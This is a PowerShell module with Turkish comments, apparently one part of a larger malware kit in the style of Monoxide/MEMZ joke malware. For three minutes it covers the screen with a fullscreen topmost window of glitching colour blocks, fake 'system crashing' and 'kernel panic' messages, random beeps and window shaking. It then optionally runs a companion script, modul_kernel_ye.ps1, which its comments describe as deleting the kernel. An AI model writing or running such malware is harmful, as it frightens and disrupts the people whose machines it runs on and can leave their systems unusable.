# ============================================================
# EN – GÖRSEL ÇÖKÜŞ (MONOXIDE TARZI + EKSTRA EFEKTLER)
# ============================================================
# Bu modül:
# - 3 dakika boyunca ekranı bozar (pixsellesme, negatif renk, glitch)
# - Rastgele renk patlamaları
# - Ekran sallama
# - Ses patlamaları
# - Sonunda kernel silme (eğer aktifse)
# ============================================================

try {
    Write-Host "[EN] Görsel çöküş başlatılıyor..." -ForegroundColor Red -BackgroundColor Black

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Runtime.InteropServices

    # Pencere sallama API
    $MoveWindow = Add-Type -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'@ -Name "WinAPI" -Namespace "Console" -PassThru

    $hWnd = [Console.WinAPI]::GetConsoleWindow()

    $form = New-Object System.Windows.Forms.Form
    $form.WindowState = 'Maximized'
    $form.FormBorderStyle = 'None'
    $form.TopMost = $true
    $form.BackColor = 'Black'

    $label = New-Object System.Windows.Forms.Label
    $label.Dock = 'Fill'
    $label.Font = New-Object System.Drawing.Font('Consolas', 40, [System.Drawing.FontStyle]::Bold)
    $label.TextAlign = 'MiddleCenter'
    $label.ForeColor = 'White'
    $label.Text = 'SİSTEM ÇÖKÜYOR'
    $form.Controls.Add($label)

    $timer1 = New-Object System.Windows.Forms.Timer
    $timer1.Interval = 50
    $timer1.Add_Tick({
        try {
            $g = $form.CreateGraphics()
            # Pixsellesme (büyük bloklar)
            for ($i=0; $i -lt 500; $i++) {
                $x = Get-Random -Min 0 -Max $form.Width
                $y = Get-Random -Min 0 -Max $form.Height
                $w = Get-Random -Min 10 -Max 200
                $h = Get-Random -Min 10 -Max 200
                $r = Get-Random -Min 0 -Max 256
                $g2 = Get-Random -Min 0 -Max 256
                $b = Get-Random -Min 0 -Max 256
                $renk = [System.Drawing.Color]::FromArgb($r, $g2, $b)
                $brush = New-Object System.Drawing.SolidBrush($renk)
                $g.FillRectangle($brush, $x, $y, $w, $h)
            }
            # Negatif renk efekti
            $label.ForeColor = [System.Drawing.Color]::FromArgb(
                (Get-Random -Min 0 -Max 256),
                (Get-Random -Min 0 -Max 256),
                (Get-Random -Min 0 -Max 256)
            )
            $label.BackColor = [System.Drawing.Color]::FromArgb(
                (Get-Random -Min 0 -Max 256),
                (Get-Random -Min 0 -Max 256),
                (Get-Random -Min 0 -Max 256)
            )
            $g.Dispose()
        } catch {}
    })

    $timer2 = New-Object System.Windows.Forms.Timer
    $timer2.Interval = 1000
    $timer2.Add_Tick({
        try {
            # Her saniye rastgele bir mesaj değişimi
            $mesajlar = @(
                "SİSTEM ÇÖKÜYOR",
                "VERİ KAYBI YAŞANIYOR",
                "KERNEL PANİK",
                "BELLEK DOLDU",
                "SİSTEM DURDU"
            )
            $label.Text = $mesajlar | Get-Random
            # Ses patlaması
            $freq = Get-Random -Min 100 -Max 2000
            [System.Console]::Beep($freq, 100)
            # Pencere sallama
            $x = Get-Random -Min -15 -Max 15
            $y = Get-Random -Min -15 -Max 15
            [Console.WinAPI]::MoveWindow($hWnd, $x, $y, 800, 600, $true)
        } catch {}
    })

    $timer1.Start()
    $timer2.Start()

    # 3 dakika bekle
    Start-Sleep -Seconds 180

    $timer1.Stop()
    $timer2.Stop()
    $form.Close()
    [Console.WinAPI]::MoveWindow($hWnd, 0, 0, 800, 600, $true)

    Write-Host "[EN] Görsel çöküş tamamlandı." -ForegroundColor Red

    # Kernel silme (eğer aktifse)
    if ($KERNEL_SIL -eq 1) {
        Write-Host "[EN] Kernel siliniyor..." -ForegroundColor Red -BackgroundColor Black
        . ./modul_kernel_ye.ps1
    }

    $log = "C:\EN_Log.txt"
    Add-Content -Path $log -Value "[$(Get-Date)] Görsel çöküş tamamlandı."

} catch {
    Write-Host "[EN] Görsel çöküş hatasi: $_" -ForegroundColor Red
}